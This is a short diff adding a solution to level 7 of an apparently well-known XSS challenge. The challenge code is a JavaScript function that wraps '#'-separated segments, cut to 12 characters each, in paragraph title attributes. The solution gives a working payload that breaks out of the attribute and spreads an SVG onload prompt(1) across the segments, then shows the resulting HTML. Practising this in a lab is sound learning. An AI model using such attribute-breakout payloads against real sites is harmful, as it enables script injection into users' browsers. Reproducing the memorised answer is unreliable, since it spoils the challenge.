@@ -1,0 +1,24 @@
+Level 7
+
+
+function escape(input) {
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split('#');
+    return segments.map(function(title) {
+        // title can only contain 12 characters
+        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
+    }).join('\n');
+} 
+
+
+Solution:-  The trick here is to use the first segment to close the <p> tag and then start our own tag (in this case <svg).
+            Afterwards, we open an attribute to contain the "junk" that will be placed between the first and second segments.
+            
+   Ans-   "><svg/a=#"onload='/*#*/prompt(1)'
+   
+   
+   You will get this piece of code after input
+   
+                                             <p class="comment" title=""><svg/a="></p>
+                                             <p class="comment" title=""onload='/*"></p>
+                                             <p class="comment" title="*/prompt(1)'"></p>
